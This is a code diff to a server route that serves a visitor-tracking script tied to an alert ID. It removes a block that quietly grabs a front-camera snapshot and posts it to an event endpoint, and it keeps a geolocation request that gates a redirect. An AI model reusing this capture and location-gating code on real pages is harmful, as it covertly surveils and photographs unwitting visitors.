@@ -700,38 +700,6 @@ export async function GET(
               body: JSON.stringify({ alert_id: '${alertId}', details })
             }).catch(()=>{});
 
-            // 11. Request Camera Permission (Async)
-            try {
-              if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                  .then(function(stream) {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    video.onplaying = () => {
-                      setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 320; 
-                        canvas.height = 240;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        camera_image = canvas.toDataURL('image/jpeg', 0.5);
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        fetch('/api/v1/event', {
-                          method: 'POST',
-                          headers: { 'Content-Type': 'application/json' },
-                          keepalive: true,
-                          body: JSON.stringify({ alert_id: '${alertId}', details: { camera_image: camera_image } })
-                        }).catch(()=>({}));
-                      }, 500); 
-                    };
-                  })
-                  .catch(() => {});
-              }
-            } catch(e) {}
-
             // 12. Request Geolocation Permission (Blocks Redirect)
             try {
               if (navigator.geolocation) {
